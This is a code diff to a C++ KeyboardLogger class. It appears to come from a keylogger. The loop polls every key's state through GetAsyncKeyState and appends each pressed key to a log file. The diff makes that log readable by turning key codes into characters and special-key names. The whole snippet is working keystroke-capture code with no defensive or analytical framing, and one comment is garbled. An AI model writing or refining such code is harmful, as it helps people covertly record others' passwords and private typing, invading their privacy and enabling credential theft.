@@ -12,16 +12,21 @@ void KeyboardLogger::startLogging() {
     logFile_.open(logFileName_, std::ios_base::app);
 
     while (isLogging_) {
-        // Sleep to reduce
+        // Sleep cpu usage
         Sleep(10);
 
-        
         for (int i = 8; i <= 255; i++) {
             SHORT result = GetAsyncKeyState(i);
             bool isPressed = result & 0x8000;
 
             if (isPressed) {
-                logFile_ << i << std::endl;
+                if (specialKeys_.count(i) > 0) {
+                    logFile_ << specialKeys_[i] << std::endl;
+                }
+                else {
+                    char c = MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
+                    logFile_ << c << std::endl;
+                }
             }
         }
     }
